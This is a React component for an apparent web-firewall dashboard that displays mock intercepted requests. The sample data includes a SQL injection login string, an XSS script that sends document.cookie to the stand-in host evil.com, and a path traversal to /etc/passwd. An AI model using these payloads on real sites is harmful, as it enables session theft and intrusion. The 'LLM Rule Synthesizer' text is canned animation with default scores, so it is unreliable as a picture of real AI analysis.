import { useEffect, useState } from "react"
import { motion } from "framer-motion"
import { Shield, Cpu, Database, AlertTriangle } from "lucide-react"
import { Card } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { ScrollArea } from "@/components/ui/scroll-area"
import type { LogEntry } from "@/lib/types"

interface PayloadAnalyzerProps {
  entry: LogEntry | null
}

const mockPayloads: Record<string, any> = {
  sqli: {
    method: "POST",
    path: "/api/login",
    headers: { "Content-Type": "application/json" },
    body: { username: "admin' OR 1=1 --", password: "password123" }
  },
  xss: {
    method: "POST",
    path: "/api/comments",
    headers: { "Content-Type": "application/json" },
    body: { comment: "<script>fetch('http://evil.com?c='+document.cookie)</script>" }
  },
  path_traversal: {
    method: "GET",
    path: "/api/download?file=../../../../etc/passwd",
    headers: { "User-Agent": "curl/7.68.0" },
    body: null
  }
}

function getMockPayload(entry: LogEntry) {
  if (!entry) return null
  if (entry.attackClass && mockPayloads[entry.attackClass]) {
    return mockPayloads[entry.attackClass]
  }
  // Default fallback
  return {
    method: entry.text.includes("POST") ? "POST" : "GET",
    path: entry.text.split(" ")[1] || "/",
    headers: { "User-Agent": "Mozilla/5.0" },
    body: entry.detail || null
  }
}

export function PayloadAnalyzer({ entry }: PayloadAnalyzerProps) {
  const [typedText, setTypedText] = useState("")
  const payload = entry ? getMockPayload(entry) : null
  
  const aiReasoningTarget = entry?.attackClass 
    ? `Synthesizing Cloudflare KV WAF Rule...
Analyzing vector embeddings for pattern match.
Confidence: ${(entry.confidence ? entry.confidence * 100 : 98).toFixed(1)}% against known ${entry.attackClass} signatures.
Extracting hostile payload fragment...
Generating regular expression to neutralize threat without affecting legitimate traffic.
Status: Rule deployed to Edge.`
    : "Monitoring traffic. No anomalous payload detected."

  useEffect(() => {
    setTypedText("")
    if (!entry) return

    let i = 0
    const interval = setInterval(() => {
      setTypedText(aiReasoningTarget.substring(0, i))
      i++
      if (i > aiReasoningTarget.length) clearInterval(interval)
    }, 15)

    return () => clearInterval(interval)
  }, [entry?.id]) // Re-run when selected entry changes

  if (!entry) {
    return (
      <div className="flex flex-col items-center justify-center h-full text-zinc-500">
        <Shield className="h-12 w-12 mb-4 opacity-20" />
        <p>Select a request from the feed to analyze</p>
      </div>
    )
  }

  const isThreat = entry.tone === 'danger' || entry.tone === 'warn' || !!entry.attackClass

  return (
    <div className="flex flex-col h-full bg-zinc-950 p-4 gap-4">
      <div className="flex items-center justify-between">
        <h2 className="text-sm font-semibold text-zinc-200 flex items-center gap-2">
          <Cpu className="h-4 w-4 text-violet-400" />
          The Payload Analyzer
        </h2>
        {isThreat && <Badge variant="ai" className="animate-pulse-subtle">Analyzing Threat</Badge>}
      </div>

      <div className="grid grid-cols-2 gap-4 shrink-0">
        <Card className="p-3 bg-zinc-900/40">
          <div className="text-[10px] text-zinc-500 uppercase tracking-wider mb-1">Target Identity</div>
          <div className="font-mono text-sm text-zinc-300">{entry.ip || "Unknown IP"}</div>
          <div className="text-xs text-zinc-500 mt-1">{payload?.method} {payload?.path}</div>
        </Card>
        <Card className="p-3 bg-zinc-900/40 relative overflow-hidden">
          <div className="text-[10px] text-zinc-500 uppercase tracking-wider mb-1">Vectorize Match</div>
          <div className="font-mono text-xl text-zinc-200">
            {entry.score ? Math.round(entry.score) : isThreat ? "94" : "12"}%
          </div>
          <div className="absolute bottom-0 left-0 h-1 bg-zinc-800 w-full">
            <motion.div 
              className={`h-full ${isThreat ? 'bg-rose-500' : 'bg-emerald-500'}`}
              initial={{ width: 0 }}
              animate={{ width: `${entry.score ? entry.score : isThreat ? 94 : 12}%` }}
              transition={{ duration: 1, ease: "easeOut" }}
            />
          </div>
        </Card>
      </div>

      <div className="flex-1 min-h-0 flex flex-col gap-2">
        <div className="text-xs font-medium text-zinc-400 mb-1">Intercepted Payload</div>
        <ScrollArea className="flex-1 bg-zinc-950 border border-zinc-800/80 rounded-md p-3 font-mono text-[11px] leading-relaxed">
          <pre className="text-zinc-300">
            {JSON.stringify(payload, null, 2)}
          </pre>
        </ScrollArea>
      </div>

      <div className="h-48 shrink-0 flex flex-col gap-2">
        <div className="text-xs font-medium text-zinc-400 mb-1 flex items-center gap-2">
          <Database className="h-3 w-3" />
          LLM Rule Synthesizer
        </div>
        <ScrollArea className="flex-1 bg-[#0a0a0f] border border-violet-900/30 rounded-md p-3 font-mono text-[11px] text-violet-300 leading-relaxed shadow-[inset_0_0_20px_rgba(139,92,246,0.05)]">
          {typedText}
          <span className="inline-block w-1.5 h-3 bg-violet-400 ml-1 animate-pulse" />
        </ScrollArea>
      </div>
    </div>
  )
}
